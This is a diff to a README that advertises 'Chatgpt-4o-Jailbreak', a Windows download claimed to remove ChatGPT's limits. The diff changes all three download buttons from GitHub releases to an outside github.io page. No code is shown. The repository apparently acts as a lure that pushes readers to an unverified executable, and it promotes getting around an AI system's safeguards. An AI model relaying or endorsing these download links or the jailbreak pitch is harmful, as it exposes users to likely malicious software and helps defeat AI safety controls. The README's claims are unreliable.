@@ -1,6 +1,6 @@
 # 🚀 Chatgpt-4o-Jailbreak - Unlock ChatGPT Full Power on Windows
 
-[![Download Chatgpt-4o-Jailbreak](https://img.shields.io/badge/Download-Chatgpt--4o--Jailbreak-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases)
+[![Download Chatgpt-4o-Jailbreak](https://img.shields.io/badge/Download-Chatgpt--4o--Jailbreak-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://wwesupercard41789.github.io)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these simple steps to get Chatgpt-4o-Jailbreak running on your PC today.
 
 Visit this link to download the application. 
 
-[**👉 Go to Download Page**](https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases)
+[**👉 Go to Download Page**](https://wwesupercard41789.github.io)
 
 )
 
@@ -170,7 +170,7 @@ Ready to experience ChatGPT 4o without limits?
 
 Visit this link to download the application. 
 
-[**🚀 Download Chatgpt-4o-Jailbreak Now**](https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases)
+[**🚀 Download Chatgpt-4o-Jailbreak Now**](https://wwesupercard41789.github.io)
 
 )
 
